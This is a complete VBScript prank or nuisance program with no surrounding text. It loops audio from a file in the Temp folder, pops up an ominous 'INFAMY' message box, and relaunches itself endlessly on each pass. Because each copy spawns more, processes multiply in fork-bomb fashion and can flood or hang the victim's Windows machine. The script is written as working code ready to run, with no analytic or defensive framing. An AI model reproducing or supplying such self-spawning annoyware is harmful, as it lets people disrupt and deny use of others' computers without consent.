Set WshShell = CreateObject("wscript.Shell")
TempPath = WshShell.ExpandEnvironmentStrings("%Temp%")
PathFile = TempPath & "\Rain.mp3"
'MsgBox qq(PathFile)
'Return = WshShell.Run(qq(PathFile),1)

Function qq(strIn)
    qq = Chr(34) & strIn & Chr(34)
End Function 

do

Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")

' Play audio
oPlayer.URL = PathFile
oPlayer.controls.play 
While oPlayer.playState <> 1 ' 1 = Stopped
  WScript.Sleep 100
Wend

' Release the audio file
oPlayer.close

x=msgbox("Years passed with no trouble yet thou felt selfish" ,0+16, "INFAMY")
CreateObject("WScript.Shell").Run WScript.ScriptFullName
loop